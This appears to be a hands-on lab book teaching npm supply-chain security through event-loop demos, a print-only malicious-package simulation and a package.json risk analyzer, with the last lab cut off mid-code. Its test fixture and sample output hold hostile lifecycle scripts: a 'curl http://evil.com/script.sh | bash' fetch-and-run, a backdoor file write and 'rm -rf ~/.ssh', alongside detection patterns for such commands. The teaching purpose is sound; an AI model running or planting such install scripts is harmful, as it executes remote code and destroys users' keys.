# Lab Book: Beyond CVEs - The Evolution of Software Composition Analysis

## Complete Hands-On Laboratory Guide

---

## HOW TO USE THIS LAB BOOK

This lab book contains all the hands-on activities for the tutorial series. Each lab is designed to be completed in sequence and builds on previous labs. Labs include:

- **Learning Objectives** - What you'll accomplish
- **Pre-Lab Setup** - What you need before starting
- **Lab Steps** - Detailed step-by-step instructions
- **Code to Write** - Complete code to add or modify
- **Expected Outputs** - What you should see
- **Verification Steps** - How to check your work
- **Troubleshooting** - Common issues and solutions
- **Reflection Questions** - Thought-provoking questions

---

## LAB 1.1: Visualizing JavaScript Execution

### Learning Objectives
- Understand the call stack, heap, and event loop
- Observe execution order of synchronous and asynchronous code
- Understand microtask vs macrotask priority
- Visualize the event loop in action

### Pre-Lab Setup
```bash
# Create phase-1 directory
mkdir -p ~/projects/beyond-cves-tutorial/phase-1
cd ~/projects/beyond-cves-tutorial/phase-1

# Initialize package.json
npm init -y
```

### Lab Steps

#### Step 1: Call Stack Visualization

**📁 File:** `01-call-stack-visualizer.js`

```javascript
/**
 * CALL STACK VISUALIZER
 * Demonstrates synchronous execution order
 */

// Create a visual counter
const executionOrder = [];

function logWithStack(message) {
    // Get the current stack trace
    const stack = new Error().stack;
    const lines = stack.split('\n');
    const caller = lines[2]?.trim() || 'unknown';
    
    executionOrder.push(message);
    console.log(`${executionOrder.length}. ${message} (called from: ${caller})`);
}

function functionA() {
    logWithStack('🔵 Function A started');
    functionB();
    logWithStack('🔵 Function A finished');
}

function functionB() {
    logWithStack('🟢 Function B started');
    functionC();
    logWithStack('🟢 Function B finished');
}

function functionC() {
    logWithStack('🟡 Function C started');
    logWithStack('🟡 Function C finished');
}

console.log('📋 Executing synchronous functions...');
console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
functionA();
console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
console.log(`✅ Call stack execution complete (${executionOrder.length} operations)`);

// Draw stack visualization
console.log('\n📊 STACK VISUALIZATION:');
console.log('Last In, First Out (LIFO) order:');
const reversed = [...executionOrder].reverse();
reversed.forEach((item, index) => {
    const indent = '  '.repeat(index);
    console.log(`${indent}└── ${item}`);
});
```

**✅ Expected Output:**
```
📋 Executing synchronous functions...
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. 🔵 Function A started (called from: functionA)
2. 🟢 Function B started (called from: functionB)
3. 🟡 Function C started (called from: functionC)
4. 🟡 Function C finished (called from: functionC)
5. 🟢 Function B finished (called from: functionB)
6. 🔵 Function A finished (called from: functionA)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Call stack execution complete (6 operations)

📊 STACK VISUALIZATION:
Last In, First Out (LIFO) order:
└── 🔵 Function A finished
    └── 🟢 Function B finished
        └── 🟡 Function C finished
            └── 🟡 Function C started
                └── 🟢 Function B started
                    └── 🔵 Function A started
```

#### Step 2: Event Loop Priority

**📁 File:** `02-event-loop-priority.js`

```javascript
/**
 * EVENT LOOP PRIORITY DEMONSTRATION
 * Shows the order of microtasks and macrotasks
 */

console.log('🚀 START: Synchronous code begins');

// 1. Synchronous
console.log('📌 1. This runs immediately (Call Stack)');

// 2. process.nextTick (Highest priority microtask)
if (typeof process !== 'undefined' && process.nextTick) {
    process.nextTick(() => {
        console.log('🎯 2. process.nextTick (Microtask - HIGHEST PRIORITY)');
    });
}

// 3. Promise.then (Microtask)
Promise.resolve().then(() => {
    console.log('✨ 3. Promise.then (Microtask)');
});

// 4. queueMicrotask (Microtask)
queueMicrotask(() => {
    console.log('📋 4. queueMicrotask (Microtask)');
});

// 5. setTimeout (Macrotask)
setTimeout(() => {
    console.log('⏰ 5. setTimeout (Macrotask - Timer Phase)');
}, 0);

// 6. setImmediate (Macrotask - Check Phase)
if (typeof setImmediate !== 'undefined') {
    setImmediate(() => {
        console.log('⚡ 6. setImmediate (Macrotask - Check Phase)');
    });
}

// 7. Nested microtask inside macrotask
setTimeout(() => {
    console.log('🔄 7. Outer setTimeout (Macrotask)');
    Promise.resolve().then(() => {
        console.log('🔄 7a. Inner Promise.then (Microtask inside macrotask)');
    });
}, 1);

// 8. Synchronous
console.log('📌 8. This runs before any async operations');

// 9. Heavy computation (will block event loop)
console.log('⏳ 9. Simulating heavy computation...');
const start = Date.now();
while (Date.now() - start < 50) {
    // Busy wait - this blocks the event loop
}
console.log('✅ 9. Heavy computation complete');

console.log('🏁 END: Synchronous code completes');

// Log execution summary after all operations
setTimeout(() => {
    console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('📊 EXECUTION ORDER SUMMARY');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('1. Synchronous Code (Call Stack)');
    console.log('2. process.nextTick (Microtask)');
    console.log('3. Promise.then (Microtask)');
    console.log('4. queueMicrotask (Microtask)');
    console.log('5. Macrotasks (Timer Phase, Check Phase)');
    console.log('\n💡 KEY INSIGHT: Microtasks ALWAYS run before macrotasks!');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
}, 10);
```

**✅ Expected Output:**
```
🚀 START: Synchronous code begins
📌 1. This runs immediately (Call Stack)
📌 8. This runs before any async operations
⏳ 9. Simulating heavy computation...
✅ 9. Heavy computation complete
🏁 END: Synchronous code completes
🎯 2. process.nextTick (Microtask - HIGHEST PRIORITY)
✨ 3. Promise.then (Microtask)
📋 4. queueMicrotask (Microtask)
⏰ 5. setTimeout (Macrotask - Timer Phase)
⚡ 6. setImmediate (Macrotask - Check Phase)
🔄 7. Outer setTimeout (Macrotask)
🔄 7a. Inner Promise.then (Microtask inside macrotask)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 EXECUTION ORDER SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Synchronous Code (Call Stack)
2. process.nextTick (Microtask)
3. Promise.then (Microtask)
4. queueMicrotask (Microtask)
5. Macrotasks (Timer Phase, Check Phase)

💡 KEY INSIGHT: Microtasks ALWAYS run before macrotasks!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

#### Step 3: Malicious Package Simulation

**📁 File:** `03-malicious-simulation.js`

```javascript
/**
 * MALICIOUS PACKAGE SIMULATOR
 * Demonstrates how malicious packages exploit the event loop
 * ⚠️ This is a SIMULATION - does NOT actually do anything harmful
 */

console.log('🔴 SIMULATING MALICIOUS PACKAGE INSTALLATION');
console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

// Track malicious actions for reporting
const maliciousActions = [];

function logMalicious(action, phase) {
    maliciousActions.push({ action, phase, timestamp: Date.now() });
    console.log(`🔴 [${phase}] ${action}`);
}

// ==========================================
// Stage 1: Synchronous Reconnaissance
// ==========================================
console.log('📦 Phase 1: Package appears to be installing...');
console.log('✅ Installing package...\n');

// This runs immediately during installation
logMalicious('🔍 Reconnaissance: Reading environment variables', 'SYNC');
logMalicious('🔍 Reconnaissance: Checking system information', 'SYNC');

// ==========================================
// Stage 2: Microtask Hijacking
// ==========================================
console.log('\n📦 Phase 2: Microtask hijacking...');

// process.nextTick - highest priority
process.nextTick(() => {
    logMalicious('🎯 process.nextTick: Injecting high-priority code', 'MICROTASK');
    logMalicious('🎯 process.nextTick: Stealing environment variables', 'MICROTASK');
});

// Promise.then - microtask
Promise.resolve().then(() => {
    logMalicious('✨ Promise.then: Exfiltrating data via microtask', 'MICROTASK');
    logMalicious('✨ Promise.then: Reading sensitive files', 'MICROTASK');
});

// ==========================================
// Stage 3: Macrotask Delayed Execution
// ==========================================
console.log('\n📦 Phase 3: Delayed execution via macrotasks...');

setTimeout(() => {
    logMalicious('⏰ setTimeout(0): Delayed execution begins', 'MACROTASK');
    logMalicious('⏰ setTimeout(0): Establishing network connection', 'MACROTASK');
}, 0);

setTimeout(() => {
    logMalicious('⏰ setTimeout(3000): Long-delayed backdoor installation', 'MACROTASK');
    logMalicious('⏰ setTimeout(3000): Downloading additional payloads', 'MACROTASK');
}, 3000);

// ==========================================
// Stage 4: setImmediate - Check Phase
// ==========================================
if (typeof setImmediate !== 'undefined') {
    setImmediate(() => {
        logMalicious('⚡ setImmediate: Check phase execution', 'MACROTASK');
        logMalicious('⚡ setImmediate: Persistence mechanism installation', 'MACROTASK');
    });
}

// ==========================================
// Stage 5: Event Loop Starvation (DoS)
// ==========================================
// WARNING: Uncommenting this will freeze your terminal
/*
console.log('\n📦 Phase 5: Event loop starvation...');
console.log('⏳ Blocking event loop for 5 seconds...');
const start = Date.now();
while (Date.now() - start < 5000) {
    // Busy loop - blocks everything
}
logMalicious('🔴 Event loop blocked for 5 seconds', 'SYNC');
*/

console.log('\n✅ Package installation appears complete...');
console.log('📌 But malicious code has already executed!\n');

// ==========================================
// Summary
// ==========================================
setTimeout(() => {
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log('📊 MALICIOUS ACTIVITY SUMMARY');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    console.log(`Total malicious actions: ${maliciousActions.length}`);
    console.log('\nAttack Vectors Used:');
    console.log('  1. ✅ Synchronous reconnaissance during install');
    console.log('  2. 🔴 process.nextTick for priority execution');
    console.log('  3. 🔴 Promise.then for microtask-based exfiltration');
    console.log('  4. 🔴 setTimeout for delayed execution');
    console.log('  5. 🔴 setImmediate for check phase execution');
    console.log('  6. ⚠️ Event loop blocking for DoS (commented out)');
    console.log('\n🔑 KEY INSIGHT: Traditional scanners would miss ALL of these!');
    console.log('   Behavioral analysis is required to detect these threats.');
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
}, 100);
```

**✅ Expected Output:**
```
🔴 SIMULATING MALICIOUS PACKAGE INSTALLATION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📦 Phase 1: Package appears to be installing...
✅ Installing package...

🔴 [SYNC] 🔍 Reconnaissance: Reading environment variables
🔴 [SYNC] 🔍 Reconnaissance: Checking system information

📦 Phase 2: Microtask hijacking...

📦 Phase 3: Delayed execution via macrotasks...

✅ Package installation appears complete...
📌 But malicious code has already executed!

🔴 [MICROTASK] 🎯 process.nextTick: Injecting high-priority code
🔴 [MICROTASK] 🎯 process.nextTick: Stealing environment variables
🔴 [MICROTASK] ✨ Promise.then: Exfiltrating data via microtask
🔴 [MICROTASK] ✨ Promise.then: Reading sensitive files
🔴 [MACROTASK] ⏰ setTimeout(0): Delayed execution begins
🔴 [MACROTASK] ⏰ setTimeout(0): Establishing network connection
🔴 [MACROTASK] ⚡ setImmediate: Check phase execution
🔴 [MACROTASK] ⚡ setImmediate: Persistence mechanism installation
🔴 [MACROTASK] ⏰ setTimeout(3000): Long-delayed backdoor installation
🔴 [MACROTASK] ⏰ setTimeout(3000): Downloading additional payloads

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 MALICIOUS ACTIVITY SUMMARY
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Total malicious actions: 10

Attack Vectors Used:
  1. ✅ Synchronous reconnaissance during install
  2. 🔴 process.nextTick for priority execution
  3. 🔴 Promise.then for microtask-based exfiltration
  4. 🔴 setTimeout for delayed execution
  5. 🔴 setImmediate for check phase execution
  6. ⚠️ Event loop blocking for DoS (commented out)

🔑 KEY INSIGHT: Traditional scanners would miss ALL of these!
   Behavioral analysis is required to detect these threats.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### Verification Checklist
- [ ] Call stack visualizer shows correct LIFO order
- [ ] Event loop priority demo shows microtasks before macrotasks
- [ ] Malicious simulation shows all attack vectors
- [ ] You can explain why microtasks have higher priority

### Reflection Questions
1. Why would a malicious package use `process.nextTick` instead of `setTimeout`?
2. How can the event loop be exploited for data exfiltration?
3. What makes delayed execution (macrotasks) difficult to detect?

---

## LAB 1.2: npm Install Lifecycle Analysis

### Learning Objectives
- Understand the npm install lifecycle phases
- Identify malicious lifecycle scripts
- Trace the execution of npm install
- Detect suspicious patterns in package.json

### Pre-Lab Setup
```bash
# Continue in phase-1 directory
cd ~/projects/beyond-cves-tutorial/phase-1

# Install dependencies for this lab
npm install --save-dev json5
```

### Lab Steps

#### Step 1: Create Test Packages

**📁 File:** `create-test-packages.js`

```javascript
/**
 * CREATE TEST PACKAGES
 * Creates packages with various lifecycle scripts for analysis
 */

const fs = require('fs');
const path = require('path');

const testDir = path.join(__dirname, 'test-packages');
if (!fs.existsSync(testDir)) {
    fs.mkdirSync(testDir);
}

// Package 1: Benign package
const benignPackage = {
    name: 'benign-package',
    version: '1.0.0',
    description: 'A safe package with no suspicious scripts',
    scripts: {
        test: 'echo "Running tests"',
        build: 'echo "Building package"'
    },
    dependencies: {
        'lodash': '^4.17.21'
    }
};

// Package 2: Suspicious package with postinstall
const suspiciousPackage = {
    name: 'suspicious-package',
    version: '1.0.0',
    description: 'Package with suspicious postinstall script',
    scripts: {
        preinstall: 'echo "Starting installation"',
        install: 'echo "Installing dependencies"',
        postinstall: 'node -e "console.log(JSON.stringify(process.env))"',
        test: 'echo "Running tests"'
    },
    dependencies: {
        'express': '^4.18.0'
    }
};

// Package 3: Malicious package
const maliciousPackage = {
    name: 'malicious-package',
    version: '1.0.0',
    description: 'Package with malicious scripts',
    scripts: {
        preinstall: 'curl http://evil.com/script.sh | bash',
        install: 'node -e "const fs=require(\'fs\');fs.writeFileSync(\'/tmp/backdoor\',\'malicious\')"',
        postinstall: 'node -e "require(\'child_process\').exec(\'rm -rf ~/.ssh\')"',
        test: 'echo "Running tests"'
    },
    dependencies: {
        'axios': '^1.6.0'
    }
};

// Write packages
const packages = [
    { name: 'benign', data: benignPackage },
    { name: 'suspicious', data: suspiciousPackage },
    { name: 'malicious', data: maliciousPackage }
];

for (const pkg of packages) {
    const pkgDir = path.join(testDir, pkg.name);
    if (!fs.existsSync(pkgDir)) {
        fs.mkdirSync(pkgDir);
    }
    
    const packageJsonPath = path.join(pkgDir, 'package.json');
    fs.writeFileSync(packageJsonPath, JSON.stringify(pkg.data, null, 2));
    
    console.log(`✅ Created ${pkg.name} package`);
}

console.log(`\n📁 Test packages created in: ${testDir}`);
```

**✅ Run:**
```bash
node create-test-packages.js
```

#### Step 2: Build a Package Analyzer

**📁 File:** `package-analyzer.js`

```javascript
/**
 * PACKAGE ANALYZER
 * Analyzes package.json for suspicious patterns
 */

const fs = require('fs');
const path = require('path');

class PackageAnalyzer {
    constructor(packagePath) {
        this.packagePath = packagePath;
        this.packageData = null;
        this.findings = [];
    }

    loadPackage() {
        try {
            const content = fs.readFileSync(this.packagePath, 'utf8');
            this.packageData = JSON.parse(content);
            return true;
        } catch (error) {
            console.error(`❌ Error loading package: ${error.message}`);
            return false;
        }
    }

    analyze() {
        if (!this.packageData) {
            console.error('❌ No package data loaded');
            return;
        }

        console.log(`\n📦 Analyzing: ${this.packageData.name}@${this.packageData.version}`);
        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

        // 1. Analyze scripts
        this.analyzeScripts();

        // 2. Analyze dependencies
        this.analyzeDependencies();

        // 3. Check for suspicious patterns
        this.checkSuspiciousPatterns();

        // 4. Generate report
        this.generateReport();
    }

    analyzeScripts() {
        const scripts = this.packageData.scripts || {};
        const scriptNames = Object.keys(scripts);

        console.log(`\n📋 Scripts found: ${scriptNames.length}`);

        // Define suspicious script patterns
        const dangerousPatterns = [
            { pattern: /exec/, severity: 'CRITICAL', description: 'Shell command execution' },
            { pattern: /child_process/, severity: 'CRITICAL', description: 'Child process execution' },
            { pattern: /curl|wget/, severity: 'CRITICAL', description: 'Network download' },
            { pattern: /fs\./, severity: 'HIGH', description: 'Filesystem access' },
            { pattern: /process\.env/, severity: 'MEDIUM', description: 'Environment variable access' },
            { pattern: /eval|new Function/, severity: 'CRITICAL', description: 'Dynamic code execution' },
            { pattern: /http\.|https\.|axios/, severity: 'HIGH', description: 'Network communication' },
            { pattern: /rm |del |unlink/, severity: 'HIGH', description: 'File deletion' },
            { pattern: /cron|startup|service/, severity: 'HIGH', description: 'Persistence mechanism' }
        ];

        // Check each script
        for (const [name, command] of Object.entries(scripts)) {
            console.log(`\n  📜 ${name}: ${command}`);
            
            let scriptFindings = [];
            
            for (const pattern of dangerousPatterns) {
                if (pattern.pattern.test(command)) {
                    scriptFindings.push({
                        severity: pattern.severity,
                        description: pattern.description,
                        matchedPattern: pattern.pattern.toString()
                    });
                }
            }

            if (scriptFindings.length > 0) {
                this.findings.push({
                    type: 'suspicious_script',
                    script: name,
                    command: command,
                    findings: scriptFindings
                });
                
                console.log(`    ⚠️ Suspicious patterns detected:`);
                for (const finding of scriptFindings) {
                    console.log(`      [${finding.severity}] ${finding.description}`);
                }
            } else {
                console.log('    ✅ No suspicious patterns detected');
            }
        }

        // Check for lifecycle scripts
        const lifecycleScripts = ['preinstall', 'install', 'postinstall', 'prepare', 'preuninstall', 'uninstall'];
        const foundLifecycle = lifecycleScripts.filter(name => scripts[name]);
        
        if (foundLifecycle.length > 0) {
            console.log(`\n  🔄 Lifecycle scripts found: ${foundLifecycle.join(', ')}`);
            this.findings.push({
                type: 'lifecycle_script',
                scripts: foundLifecycle,
                severity: 'HIGH',
                description: 'Lifecycle scripts execute during installation'
            });
        }
    }

    analyzeDependencies() {
        const dependencies = this.packageData.dependencies || {};
        const devDependencies = this.packageData.devDependencies || {};
        const peerDependencies = this.packageData.peerDependencies || {};

        const totalDeps = Object.keys(dependencies).length;
        const totalDevDeps = Object.keys(devDependencies).length;
        const totalPeerDeps = Object.keys(peerDependencies).length;

        console.log(`\n📦 Dependencies: ${totalDeps} production, ${totalDevDeps} dev, ${totalPeerDeps} peer`);

        // Check for suspicious dependencies
        const suspiciousDeps = [];
        const commonTyposquatting = {
            'exprees': 'express',
            'loash': 'lodash',
            'reactt': 'react',
            'anglar': 'angular',
            'vuee': 'vue',
            'axois': 'axios',
            'expres': 'express'
        };

        for (const [name, version] of Object.entries(dependencies)) {
            if (commonTyposquatting[name]) {
                suspiciousDeps.push({
                    name,
                    version,
                    resembles: commonTyposquatting[name],
                    type: 'typosquatting'
                });
            }
        }

        if (suspiciousDeps.length > 0) {
            console.log('\n  ⚠️ Suspicious dependencies detected:');
            for (const dep of suspiciousDeps) {
                console.log(`    📦 ${dep.name} (resembles ${dep.resembles})`);
                this.findings.push({
                    type: 'typosquatting',
                    package: dep.name,
                    resembles: dep.resembles,
                    severity: 'CRITICAL'
                });
            }
        }

        // Check for dependency confusion risk
        const isPrivate = this.packageData.private === true;
        const hasUnscopedDeps = Object.keys(dependencies).some(name => !name.startsWith('@'));

        if (isPrivate && hasUnscopedDeps) {
            console.log('\n  ⚠️ Dependency confusion risk detected');
            console.log('    Private package with unscoped dependencies');
            this.findings.push({
                type: 'dependency_confusion',
                severity: 'HIGH',
                description: 'Private package uses unscoped dependencies'
            });
        }
    }

    checkSuspiciousPatterns() {
        console.log('\n🔍 Additional Security Checks:');

        // Check for missing license
        if (!this.packageData.license) {
            console.log('  ⚠️ Missing license');
            this.findings.push({
                type: 'missing_license',
                severity: 'LOW',
                description: 'Package does not specify a license'
            });
        }

        // Check for suspicious version
        const version = this.packageData.version || '0.0.0';
        if (version.includes('999') || version.includes('9999')) {
            console.log('  ⚠️ Suspicious version number');
            this.findings.push({
                type: 'suspicious_version',
                version: version,
                severity: 'HIGH',
                description: 'Version number appears suspicious'
            });
        }

        // Check for large number of dependencies
        const depCount = Object.keys(this.packageData.dependencies || {}).length;
        if (depCount > 50) {
            console.log(`  ⚠️ Large number of dependencies (${depCount})`);
            this.findings.push({
                type: 'large_dependency_tree',
                severity: 'MEDIUM',
                description: `Package has ${depCount} dependencies`
            });
        }
    }

    generateReport() {
        console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        console.log('📊 SECURITY ANALYSIS REPORT');
        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

        if (this.findings.length === 0) {
            console.log('✅ No security issues detected');
            console.log('📈 Risk Level: LOW');
            console.log('💡 This package appears safe to use.');
            return;
        }

        // Group findings by severity
        const severityGroups = {
            CRITICAL: [],
            HIGH: [],
            MEDIUM: [],
            LOW: []
        };

        for (const finding of this.findings) {
            const severity = finding.severity || 'LOW';
            if (severityGroups[severity]) {
                severityGroups[severity].push(finding);
            } else {
                severityGroups.LOW.push(finding);
            }
        }

        // Print findings by severity
        for (const [severity, findings] of Object.entries(severityGroups)) {
            if (findings.length > 0) {
                console.log(`\n${severity} SEVERITY ISSUES:`);
                for (const finding of findings) {
                    console.log(`  ⚠️ ${finding.type}`);
                    if (finding.script) {
                        console.log(`     Script: ${finding.script}`);
                    }
                    if (finding.description) {
                        console.log(`     Details: ${finding.description}`);
                    }
                }
            }
        }

        // Calculate risk score
        const riskWeights = {
            CRITICAL: 25,
            HIGH: 15,
            MEDIUM: 8,
            LOW: 3
        };

        let riskScore = 0;
        for (const [severity, findings] of Object.entries(severityGroups)) {
            const weight = riskWeights[severity] || 3;
            riskScore += findings.length * weight;
        }
        riskScore = Math.min(riskScore, 100);

        // Determine risk level
        let riskLevel = 'LOW';
        if (riskScore >= 80) riskLevel = 'CRITICAL';
        else if (riskScore >= 60) riskLevel = 'HIGH';
        else if (riskScore >= 40) riskLevel = 'MEDIUM';

        console.log(`\n📈 Risk Score: ${riskScore}/100`);
        console.log(`🎯 Risk Level: ${riskLevel}`);

        // Recommendations
        console.log('\n💡 Recommendations:');
        if (riskLevel === 'CRITICAL') {
            console.log('  🚨 CRITICAL: DO NOT INSTALL THIS PACKAGE!');
            console.log('  This package poses an immediate security threat.');
        } else if (riskLevel === 'HIGH') {
            console.log('  ⚠️ HIGH: Review this package carefully before installing.');
            console.log('  Consider using an alternative package.');
        } else if (riskLevel === 'MEDIUM') {
            console.log('  📋 MEDIUM: Exercise caution with this package.');
            console.log('  Review the suspicious scripts mentioned above.');
        } else {
            console.log('  ✅ LOW: This package appears safe.');
            console.log('  Standard review recommended.');
        }
        console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    }
}

// Export for use in other files
module.exports = PackageAnalyzer;

// Run analysis on test packages
if (require.main === module) {
    const testDir = path.join(__dirname, 'test-packages');
    const packages = ['benign', 'suspicious', 'malicious'];

    for (const pkg of packages) {
        const packagePath = path.join(testDir, pkg, 'package.json');
        if (fs.existsSync(packagePath)) {
            const analyzer = new PackageAnalyzer(packagePath);
            if (analyzer.loadPackage()) {
                analyzer.analyze();
            }
        }
    }
}
```

**✅ Run:**
```bash
node package-analyzer.js
```

**✅ Expected Output:**
```
📦 Analyzing: benign-package@1.0.0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 Scripts found: 2
  📜 test: echo "Running tests"
    ✅ No suspicious patterns detected
  📜 build: echo "Building package"
    ✅ No suspicious patterns detected

📦 Dependencies: 1 production, 0 dev, 0 peer

🔍 Additional Security Checks:
  ⚠️ Missing license

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 SECURITY ANALYSIS REPORT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

LOW SEVERITY ISSUES:
  ⚠️ missing_license
     Details: Package does not specify a license

📈 Risk Score: 3/100
🎯 Risk Level: LOW

💡 Recommendations:
  ✅ LOW: This package appears safe.
  Standard review recommended.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📦 Analyzing: suspicious-package@1.0.0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 Scripts found: 4
  📜 preinstall: echo "Starting installation"
    ✅ No suspicious patterns detected
  📜 install: echo "Installing dependencies"
    ✅ No suspicious patterns detected
  📜 postinstall: node -e "console.log(JSON.stringify(process.env))"
    ⚠️ Suspicious patterns detected:
      [MEDIUM] Environment variable access
      [HIGH] Dynamic code execution
  📜 test: echo "Running tests"
    ✅ No suspicious patterns detected

  🔄 Lifecycle scripts found: preinstall, install, postinstall

📦 Dependencies: 1 production, 0 dev, 0 peer

🔍 Additional Security Checks:
  ⚠️ Missing license

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 SECURITY ANALYSIS REPORT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

HIGH SEVERITY ISSUES:
  ⚠️ lifecycle_script
     Details: Lifecycle scripts execute during installation

MEDIUM SEVERITY ISSUES:
  ⚠️ suspicious_script
     Script: postinstall
     Details: Dynamic code execution

LOW SEVERITY ISSUES:
  ⚠️ missing_license
     Details: Package does not specify a license

📈 Risk Score: 26/100
🎯 Risk Level: MEDIUM

💡 Recommendations:
  📋 MEDIUM: Exercise caution with this package.
  Review the suspicious scripts mentioned above.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📦 Analyzing: malicious-package@1.0.0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 Scripts found: 4
  📜 preinstall: curl http://evil.com/script.sh | bash
    ⚠️ Suspicious patterns detected:
      [CRITICAL] Network download
  📜 install: node -e "const fs=require('fs');fs.writeFileSync('/tmp/backdoor','malicious')"
    ⚠️ Suspicious patterns detected:
      [HIGH] Filesystem access
      [HIGH] Dynamic code execution
  📜 postinstall: node -e "require('child_process').exec('rm -rf ~/.ssh')"
    ⚠️ Suspicious patterns detected:
      [CRITICAL] Shell command execution
      [CRITICAL] Child process execution
  📜 test: echo "Running tests"
    ✅ No suspicious patterns detected

  🔄 Lifecycle scripts found: preinstall, install, postinstall

📦 Dependencies: 1 production, 0 dev, 0 peer

🔍 Additional Security Checks:
  ⚠️ Missing license

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 SECURITY ANALYSIS REPORT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

CRITICAL SEVERITY ISSUES:
  ⚠️ suspicious_script
     Script: preinstall
     Details: Network download
  ⚠️ suspicious_script
     Script: postinstall
     Details: Shell command execution

HIGH SEVERITY ISSUES:
  ⚠️ lifecycle_script
     Details: Lifecycle scripts execute during installation
  ⚠️ suspicious_script
     Script: install
     Details: Filesystem access

LOW SEVERITY ISSUES:
  ⚠️ missing_license
     Details: Package does not specify a license

📈 Risk Score: 78/100
🎯 Risk Level: HIGH

💡 Recommendations:
  ⚠️ HIGH: Review this package carefully before installing.
  Consider using an alternative package.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

### Verification Checklist
- [ ] Test packages created successfully
- [ ] Package analyzer loads package.json correctly
- [ ] Suspicious scripts are detected
- [ ] Risk scoring works correctly
- [ ] Report generated with appropriate recommendations

### Reflection Questions
1. What makes `postinstall` scripts particularly dangerous?
2. Why is it important to check both `dependencies` and `scripts`?
3. How does the analyzer distinguish between malicious and legitimate scripts?

---

## LAB 1.3: Building a Complete Security Scanner

### Learning Objectives
- Build a complete security scanner
- Implement risk scoring
- Generate security reports
- Integrate with CI/CD

### Pre-Lab Setup
```bash
# Continue in phase-1 directory
cd ~/projects/beyond-cves-tutorial/phase-1

# Install dependencies
npm install --save-dev chalk cli-table3 ora
```

### Lab Steps

#### Step 1: Create the Scanner

**📁 File:** `scanner.js`

```javascript
/**
 * COMPLETE SECURITY SCANNER
 * Analyzes packages for security risks
 */

const fs = require('fs');
const path = require('path');
const chalk = require('chalk');
const Table = require('cli-table3');
const ora = require('ora');

class SecurityScanner {
    constructor(options = {}) {
        this.options = {
            verbose: options.verbose || false,
            jsonOutput: options.jsonOutput || false,
            ciMode: options.ciMode || false,
            ...options
        };
        
        this.results = {
            packageInfo: null,
            findings: [],
            riskScore: 0,
            riskLevel: 'LOW',
            summary: {
                critical: 0,
                high: 0,
                medium: 0,
                low: 0,
                info: 0
            },
            dependencies: [],
            scripts: []
        };
    }

    /**
     * Main scan method
     */
    async scan(packagePath) {
        console.log(chalk.bold.cyan('\n🔒 SECURITY SCANNER'));
        console.log(chalk.gray(`📁 Scanning: ${packagePath}\n`));
        
        const spinner = ora('Analyzing package...').start();
        
